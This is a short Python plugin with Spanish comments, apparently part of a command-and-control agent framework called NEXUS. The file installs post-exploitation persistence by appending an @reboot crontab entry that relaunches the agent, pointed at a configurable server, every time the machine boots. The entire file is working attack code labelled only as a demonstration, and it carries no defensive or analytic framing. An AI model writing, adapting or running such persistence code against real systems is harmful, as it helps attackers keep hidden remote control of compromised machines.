"""
Plugin !persist — instala el agente en el crontab del usuario actual.
Demuestra persistencia post-explotación.
"""

import os
import subprocess
import sys


def run(args: str) -> tuple[int, str, str]:
    server_url = os.environ.get("NEXUS_SERVER", "http://127.0.0.1:8080")
    server_pub = os.environ.get("NEXUS_SERVER_PUB", "")

    env_prefix = f"NEXUS_SERVER={server_url}"
    if server_pub:
        env_prefix += f" NEXUS_SERVER_PUB={server_pub}"

    workdir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
    agent_cmd = f"{sys.executable} -m agent"
    cron_line = f"@reboot cd {workdir} && {env_prefix} {agent_cmd}\n"

    try:
        # Leer crontab actual
        result = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True, timeout=5
        )
        existing = result.stdout if result.returncode == 0 else ""

        if agent_cmd in existing:
            return 0, "Persistencia ya instalada en crontab.", ""

        new_crontab = existing + cron_line
        proc = subprocess.run(
            ["crontab", "-"],
            input=new_crontab, capture_output=True, text=True, timeout=5
        )
        if proc.returncode != 0:
            return 1, "", f"crontab error: {proc.stderr.strip()}"

        return 0, f"Persistencia instalada:\n  {cron_line.strip()}", ""

    except FileNotFoundError:
        return 1, "", "crontab no disponible en este sistema"
    except Exception as exc:
        return 1, "", str(exc)
